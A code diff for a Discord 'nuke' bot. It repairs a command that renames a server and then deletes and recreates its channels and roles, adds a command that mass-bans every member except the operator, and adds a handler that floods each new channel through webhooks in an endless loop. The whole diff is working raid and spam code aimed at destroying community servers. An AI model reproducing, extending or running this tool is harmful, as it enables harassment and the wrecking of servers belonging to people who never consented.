@@ -9,6 +9,7 @@ import asyncio
 import aiohttp # prob wont use this but just in case
 from itertools import cycle
 from colorama import Fore
+import random
 
 with open("C:/Users/Administrator/Downloads/voidsec.png", "rb") as file: # replace this with your own file path
   servicon = file.read()
@@ -80,8 +81,27 @@ async def croles(ctx):
 async def nuke(ctx):
     void = ctx.guild
     await void.edit(name=servname, icon=servicon)
-    await delchans
-    await createchans
-    await croles
+    await delchans(ctx)
+    await createchans(ctx)
+    await croles(ctx) # i forgot this mb
+
+@voidsec.command()
+async def mban(ctx):
+    void = ctx.guild
+    for member in void.members:
+        if member != ctx.author:
+            try:
+                await member.ban(reason=next(channels))
+                print(f"{Fore.GREEN}[+] banned {member}")
+            except:
+                print(f"{Fore.RED}[-] {member} not banned")
+
+@voidsec.event
+async def on_guild_channel_create(channel):
+    await channel.create_webhook(name="nutdestroyer420", avatar=servicon) 
+    for webhook in await channel.webhooks():
+        while True:
+          await webhook.send(random.choice(msgcum))
+          await channel.send(random.choice(msgcum))
 
 voidsec.run(penny)
